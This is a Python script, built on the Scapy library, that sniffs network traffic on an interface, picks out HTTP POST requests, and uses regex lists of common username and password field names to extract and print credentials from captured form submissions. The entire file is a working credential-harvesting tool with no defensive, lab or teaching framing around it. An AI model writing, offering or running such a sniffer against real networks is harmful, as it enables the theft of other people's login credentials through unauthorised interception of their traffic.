from scapy.all import *
from urllib import parse
import re
from scapy.layers import http

# List of usually used username and password field
userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name', 'alias',
              'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
              'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
              'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
              'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']

passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
              'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
              'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']


def get_login_pass(body):
    user = None
    passwd = None

    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfd in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfd, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group().rstrip('\'')

    if user and passwd:
        return (user, passwd)


def pkt_parser(packet):
    # Check if the frame has TCP, IP and Raw headers
    if packet.haslayer(http.HTTPRequest) and packet[http.HTTPRequest].Method == b'POST':
        raw_fields = packet[http.HTTPRequest].getlayer('Raw').fields
        body = str(raw_fields['load'])
        user_pass = get_login_pass(body)
        # Check if the sniffer got a username and password
        if user_pass != None:
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass


# your interface adapter name
iface = "eth0"

try:
    sniff(iface=iface,
          prn=pkt_parser,  # specify the packet to parse
          store=0)
except KeyboardInterrupt:
    print('Exiting Sniffer')
    exit(0)
